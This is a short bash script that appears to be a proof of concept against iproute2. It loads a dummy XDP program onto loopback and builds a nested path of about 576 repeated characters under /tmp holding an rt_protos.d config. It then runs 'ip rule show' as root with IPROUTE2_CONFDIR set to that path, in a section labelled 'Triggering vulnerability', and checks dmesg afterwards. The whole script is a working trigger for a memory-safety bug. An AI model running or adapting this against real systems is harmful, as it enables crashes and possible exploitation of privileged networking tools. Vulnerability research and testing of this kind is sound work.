#!/bin/bash
set -e

# 1. BPF Context
echo "Setting up BPF context..."
cat <<C_EOF > diag.c
#include <linux/bpf.h>
char _license[] __attribute__((section("license"), used)) = "GPL";
__attribute__((section("prog"), used))
int xdp_dummy(struct xdp_md *ctx) { return 2; }
C_EOF
clang -O2 -target bpf -g -I/usr/include/x86_64-linux-gnu -c diag.c -o diag.o
sudo ip link set dev lo xdp obj ./diag.o sec prog || true

# 2. Segmented Path Construction
echo "Constructing segmented path..."
DIR1=$(python3 -c 'print("A"*190)')
DIR2=$(python3 -c 'print("B"*190)')
DIR3=$(python3 -c 'print("C"*196)')
BASE_DIR="/tmp/$DIR1/$DIR2/$DIR3"
sudo mkdir -p "$BASE_DIR/rt_protos.d"
sudo bash -c "echo -e '254\tdummy' > $BASE_DIR/rt_protos.d/test.conf"

# 3. Vulnerability Trigger
echo "Triggering vulnerability..."
sudo bash -c "IPROUTE2_CONFDIR=\"$BASE_DIR\" ip -details rule show"
echo "Execution Exit Code: $?"

# 4. Telemetry Check
echo "Checking kernel logs..."
dmesg | tail -n 5
